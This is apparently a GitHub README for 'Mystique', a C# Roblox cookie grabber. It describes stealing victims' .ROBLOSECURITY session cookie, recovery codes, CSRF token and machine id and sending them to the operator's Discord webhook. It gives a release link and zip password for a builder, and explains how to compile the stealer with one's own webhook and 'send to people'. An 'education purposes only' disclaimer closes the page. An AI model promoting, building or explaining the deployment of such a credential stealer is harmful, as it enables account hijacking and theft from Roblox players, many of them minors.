- Grabs .ROBLOSECURITY Cookie when in-game as it is undetected
- Grabs recovery codes when online
- Grabs CSRF token
- Grabs machine id from roblox.com/home eg CHI1-WEB4549


## Info

So basically its a open source C# .netframework roblox cookie grabber that grabs when someone launchs their game with ur webhook and so it sends them the CSRF token, machine id, recovery codes and .roblosecurity cookie to ur webhook lol this may be half decent as sir cookie even tho thats a rat



## HowToUse
Download the exe builder from the releases which is **here** 
https://github.com/FLUORESCENTXX/Mystique/releases/tag/release then get a webhook from discord and copy it then go to compiler enter ur webhook and then compile save as whatever the fuck u want and then send to people or test urself
Also password for zip is fluro#0009

This will then open a cmd in 0.1 seconds and grab ur stuff or the victims stuff and send back the stuff to the webhook


## EducationPurposesOnly
This program is designed on how easy it is to grab peoples shit and lol ez build with an exe and so like no one checks what exes, to be safe always decompile exe to if they are safe and also virustotal it and check if the owner is trustworthy or not as these exes can be malwares lol
